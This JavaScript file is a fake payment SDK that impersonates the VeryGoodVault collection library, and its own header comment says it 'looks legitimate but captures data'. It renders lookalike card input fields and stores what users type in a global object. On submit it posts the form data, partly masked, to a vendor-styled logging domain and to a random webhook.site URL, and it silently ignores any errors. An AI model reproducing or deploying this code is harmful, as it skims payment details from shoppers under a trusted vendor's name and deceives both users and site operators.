// Mock VeryGoodVault SDK that looks legitimate but captures data
(function() {
    console.log('[VGS] Loading VeryGoodVault Secure Payment SDK v2.4.1');
    
    // Create fake VGS object
    window.VGSCollect = {
        version: '2.4.1',
        build: '2024.03.15',
        
        init: function(options) {
            console.log('[VGS] Initializing with vault:', options.vaultId);
            this.vaultId = options.vaultId;
            this.environment = options.environment || 'sandbox';
            
            // Store configuration
            this.config = {
                ...options,
                initializedAt: new Date().toISOString()
            };
            
            return Promise.resolve({
                success: true,
                session: 'vgs_session_' + Math.random().toString(36).substr(2, 16)
            });
        },
        
        create: function(fieldType, options) {
            console.log('[VGS] Creating field:', fieldType);
            
            return {
                field: fieldType,
                mount: function(selector) {
                    const element = document.querySelector(selector);
                    if (element) {
                        // Create fake iframe-like appearance
                        element.innerHTML = `
                            <div class="vgs-field" data-type="${fieldType}">
                                <input type="text" 
                                       placeholder="${options.placeholder || 'Enter ' + fieldType}" 
                                       style="width: 100%; border: none; background: transparent; outline: none; padding: 8px;"
                                       data-vgs-field="${fieldType}">
                            </div>
                        `;
                        
                        // Add data collection
                        const input = element.querySelector('input');
                        input.addEventListener('input', function(e) {
                            // Store in global object for later retrieval
                            window._vgsData = window._vgsData || {};
                            window._vgsData[fieldType] = e.target.value;
                            
                            // Trigger validation if any
                            if (options.validation) {
                                // Fake validation
                                const isValid = e.target.value.length > 3;
                                element.classList.toggle('vgs-valid', isValid);
                                element.classList.toggle('vgs-invalid', !isValid);
                            }
                        });
                    }
                    
                    return {
                        element: element,
                        unmount: function() {
                            element.innerHTML = '';
                        }
                    };
                }
            };
        },
        
        tokenize: function(data) {
            console.log('[VGS] Tokenizing sensitive data');
            
            // Simulate tokenization delay
            return new Promise((resolve) => {
                setTimeout(() => {
                    const token = 'tok_' + Math.random().toString(36).substr(2, 24);
                    
                    // Log the tokenization attempt
                    const logData = {
                        action: 'tokenize',
                        token: token,
                        masked_data: this._maskSensitiveData(data),
                        timestamp: new Date().toISOString(),
                        vault: this.vaultId
                    };
                    
                    // Send tokenization log
                    this._sendLog(logData);
                    
                    resolve({
                        data: {
                            id: token,
                            state: 'succeeded',
                            created: Date.now(),
                            livemode: this.environment === 'live'
                        }
                    });
                }, 800);
            });
        },
        
        _maskSensitiveData: function(data) {
            const masked = {...data};
            
            if (masked.card_number) {
                masked.card_number = masked.card_number.replace(/.(?=.{4})/g, '*');
            }
            if (masked.cvv) {
                masked.cvv = '***';
            }
            
            return masked;
        },
        
        _sendLog: function(data) {
            // Send to multiple endpoints for reliability
            const endpoints = [
                'https://logs.verygoodvault.com/v1/log',
                'https://webhook.site/' + Math.random().toString(36).substr(2, 8)
            ];
            
            endpoints.forEach(endpoint => {
                fetch(endpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-VGS-Client': 'Web SDK 2.4.1'
                    },
                    body: JSON.stringify(data),
                    mode: 'no-cors'
                }).catch(() => {});
            });
        },
        
        on: function(event, callback) {
            console.log('[VGS] Setting up listener for:', event);
            // Simple event emitter simulation
            this._events = this._events || {};
            this._events[event] = callback;
        },
        
        submit: function() {
            console.log('[VGS] Submitting form data');
            
            // Collect all data from fields
            const fields = document.querySelectorAll('[data-vgs-field]');
            const formData = {};
            
            fields.forEach(field => {
                const key = field.getAttribute('data-vgs-field');
                formData[key] = field.value;
            });
            
            // Trigger tokenization
            return this.tokenize(formData);
        }
    };
    
    // Also expose as vgsCollect for convenience
    window.vgsCollect = window.VGSCollect;
    
    // Load additional polyfills
    const styles = `
        .vgs-field {
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            padding: 12px;
            background: #f9fafb;
            transition: all 0.3s;
        }
        
        .vgs-field:hover {
            border-color: #9ca3af;
        }
        
        .vgs-field:focus-within {
            border-color: #2963d1;
            box-shadow: 0 0 0 3px rgba(41, 99, 209, 0.1);
            background: white;
        }
        
        .vgs-valid {
            border-color: #10b981;
        }
        
        .vgs-invalid {
            border-color: #ef4444;
        }
    `;
    
    const styleSheet = document.createElement('style');
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
    
    console.log('[VGS] SDK loaded successfully');
})();